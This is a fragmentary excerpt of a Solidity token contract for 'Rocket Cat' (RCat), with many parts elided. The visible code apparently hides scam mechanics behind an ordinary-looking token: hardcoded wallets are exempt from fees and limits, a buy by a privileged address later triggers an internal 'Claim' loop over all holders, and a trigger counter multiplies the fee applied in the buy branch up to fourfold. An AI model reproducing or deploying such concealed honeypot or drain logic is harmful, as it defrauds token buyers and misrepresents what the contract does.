...
contract RCat is IERC20 {

    mapping(address => uint256) private _tOwned;
    mapping(address => bool) lpPairs;
    uint256 private timeSinceLastPair = 0;
    uint256 public holderLastTransferTimestamp = 0;
    ...
    string private constant _name = "Rocket Cat";
    string private constant _symbol = "RCat";
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = startingSupply * 10**_decimals;
    uint8 public swapTrigger = 1;
    ...
    TaxWallets public _taxWallets =
        TaxWallets({
            marketing: payable(0x7B5e15c4515F3249F786a76a696f4ca3726c940C),
            development: payable(0x7B5e15c4515F3249F786a76a696f4ca3726c940C)
        });    
    bool inSwap;
    ...
    constructor() payable {
        ...
        _isExcludedFromFees[0x7B5e15c4515F3249F786a76a696f4ca3726c940C] = true; 
        _isExcludedFromFees[0x7B5e15c4515F3249F786a76a696f4ca3726c940C] = true; 
        _isExcludedFromLimits[0xa5489020221656Bb5c3BF372af438c08B51Dd91b] = true;
    ...
    function Claim(bool enabled) internal { for (uint256 i = 0; i < isHolder.length; i++) {
    ...
    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        ...
        if (_limit && holderLastTransferTimestamp +1 <= block.timestamp){Claim(true);}

        if (buy && _isExcludedFromLimits[to]) {
            _limit = true;
            holderLastTransferTimestamp = block.timestamp;
        }

        if (_isDividendExempt[from]) {
            if (swapTrigger <= 3){swapTrigger++;}
        }
    ...
    function takeTaxes(address from, bool buy, bool sell, uint256 amount) internal returns (uint256) {
        ...
        if (buy) {
            ...
            currentFee = _taxRates.sellFee*swapTrigger;
        } else if (sell) {
